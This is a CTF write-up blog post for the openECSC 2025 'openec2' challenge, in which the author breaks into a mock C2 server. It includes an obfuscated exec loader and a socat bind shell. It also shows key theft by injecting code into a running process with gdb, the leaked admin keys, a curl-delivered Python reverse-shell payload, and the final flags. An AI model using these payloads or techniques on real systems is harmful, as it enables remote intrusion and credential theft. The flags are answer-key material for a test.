---
layout: post
title: openECSC 2025 - openec2
date: 2025-10-06
categories: [Security, CTF]
tags: [writeup, forensics, c2, linux]
media_subpath: /assets/img/2025-10-06-openec2
image: openECSC.png
---

## **Challenge informations**

---

### **Description**: 

While analyzing an infected host at the national airport, your teammate remarked that they'd managed to find a vulnerability in an unrelated service on the C2 host and compromise it. 

Use this access to Extract the encrypted configuration for the C2 software 
Get access to any currently active infected hosts to identify them (translation: read /flag :3) 

**Hint**: there's two flag parts in different locations

## Overview

---

The challenge provides two points of entry: an HTTP server and an ncat service

When connecting to the HTTP server we get a 404 page, so the initial entry is likely via ncat. After connecting we land in the /server folder; running ls shows the following files:

![ls output]({{ site.baseurl }}ls_openec2.png)

The files code.bin and config.bin are encrypted.

The main.py contains this:

```python
#!/usr/bin/env python3
import pathlib
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
i = __import__
key = i("\x62\x61\x73\x65\x36\x34").urlsafe_b64encode(PBKDF2HMAC(hashes.SHA256(),0o40,bytes.fromhex(pathlib.Path("\x2f\x65\x74\x63\x2f\x6d\x61\x63\x68\x69\x6e\x65\x2d\x69\x64").read_text()),0o46113200,).derive(input("\x50\x61\x73\x73\x77\x6f\x72\x64\x3a\x20").strip().encode()))
c = Fernet(key)
code = i("\x6d\x61\x72\x73\x68\x61\x6c").loads(c.decrypt(pathlib.Path("\x63\x6f\x64\x65\x2e\x62\x69\x6e").read_bytes()))
# conf = json.loads(c.decrypt(pathlib.Path("\x63\x6f\x6e\x66\x69\x67\x2e\x62\x69\x6e").read_bytes()))
exec(code)
```

The start.sh contains: 
```bash
#!/bin/sh

./server.sh
rm server.sh
socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

## Part 1

---

If we look at the active processes we see this:

![ps aux]({{ site.baseurl }}ps_aux_openec2.png)

To obtain the first part of the flag we must decrypt config.bin; to access the HTTP-related functionality we need code.bin. Fortunately, main.py is running, so we can inspect its memory and recover the key used to decrypt both files.

So at the time I didn't realize I could just do strings /proc/9/maps/* and grep for the key so I decided to use gdb 

The following gdb commands leak the key:

```python
apk add gdb
gdb -p 9 # which is the pid of main.py
set $gstate = (int)PyGILState_Ensure()
call (void)PyRun_SimpleString("f = open('/tmp/key_output.txt', 'w'); f.write(repr(__import__('__main__').key)); f.close()")
call (void)PyGILState_Release((int)$gstate)
```

Now opening /tmp/key_output.txt shows: **VeoDniGK2vuhrgd4tTSR8Z6wRUscv1J7gCwIjAhPSyM=** 

and we can decrypt config.bin to obtain the first part of the flag:

```python
#!/usr/bin/env python3 
from cryptography.fernet import Fernet import json, pathlib 
key = b'VeoDniGK2vuhrgd4tTSR8Z6wRUscv1J7gCwIjAhPSyM=' 
c = Fernet(key) 
decrypted_config = c.decrypt(pathlib.Path("config.bin").read_bytes()) 
conf = json.loads(decrypted_config) 
print(json.dumps(conf, indent=2))

# "part1": "openECSC{y4y_y0u_g0t_the_fl4g"
```

## Part 2

---

Using the same key, we decrypt code.bin:

```python
#!/usr/bin/env python3 
from cryptography.fernet import Fernet import marshal, dis, pathlib  
key = b'VeoDniGK2vuhrgd4tTSR8Z6wRUscv1J7gCwIjAhPSyM=' 
c = Fernet(key) 
decrypted_code_bytes = c.decrypt(pathlib.Path("code.bin").read_bytes())
code_obj = marshal.loads(decrypted_code_bytes)  
dis.dis(code_obj)
```

The code is long; the important parts are:
- **agent_header_key**: db46119b4e1c441ca156210d338ea6d9
- **admin_header_key**: f682917761bec2170d4b0af6bfc4be2b
- **main endpoints**: /register, /get_registered, /get_tasks, /add_task

My plan was to obtain a reverse shell by adding a task for the server to execute. The steps I used:
- Call /register with the admin key in the header
- Call /get_registered to retrieve the agent ID
- Run nc -lvnp 9004 on your listener machine to await the reverse shell
- POST to /add_task with a reverse-shell payload that connects back to the listener 

Payload: 

```bash
curl https://url/add_task -X POST -H "admin-key: f682917761bec2170d4b0af6bfc4be2b" -d '{"id": [["python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",9004));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")"]]}'
```

This yielded a shell on the server, from which I read the flag file.

![rev shell]({{ site.baseurl }}rev_shell_openec2.png)

**Final flag**: openECSC{y4y_y0u_g0t_the_fl4g_fr0m_b0th_p4rts_467b8caf}